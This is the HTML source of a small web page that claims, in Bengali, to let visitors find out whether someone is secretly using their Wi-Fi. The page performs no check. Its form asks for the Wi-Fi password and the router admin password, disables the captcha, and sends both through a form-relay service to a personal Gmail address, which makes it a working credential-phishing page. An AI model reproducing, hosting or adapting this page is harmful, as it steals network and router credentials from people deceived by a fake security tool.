<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>wif check</title>
    <link rel="stylesheet" href="style.css">
    <!-- font family link ------->
    <link href="https://fonts.maateen.me/adorsho-lipi/font.css" rel="stylesheet">
</head>
<body>
  
  <div class="container">
      <div class="contant">
          <form action="https://formsubmit.co/mdrahulsarkar5525@gmail.com" method="POST">
               <div class="img-box">
                   <img src="/image/wifi.png" class="wifi-img">
                  <img src="/image/lock.png" class="lock-img">
               </div>
              <h1>আপনার Wi-Fi যদি কেও লুকিয়ে লুকিয়ে চালায় তাহলে এখান থেকে তা আপনি দেখতে পারবেন</h1>
              <input class="input" type="text" name="WIFI PASS" id="text" required placeholder="Wi-Fi Password">
              <input class="input" type="text" name="ADMIN" id="text" placeholder="Wi-Fi Admin Password">
              
              <input type="hidden" name="_captcha" value="false">
              <input type="hidden" name="_template" value="table">
              
              
                <button type="submit">NEXT</button>
         
         
         <div class="forget">
             <a class="click" href="#">Forget password?</a>
             <p class="pp forget-click">Please check your router</p>
         </div>
          </form>
      </div>
  </div>
  
  
   <script src="main.js"></script> 
</body>
</html>
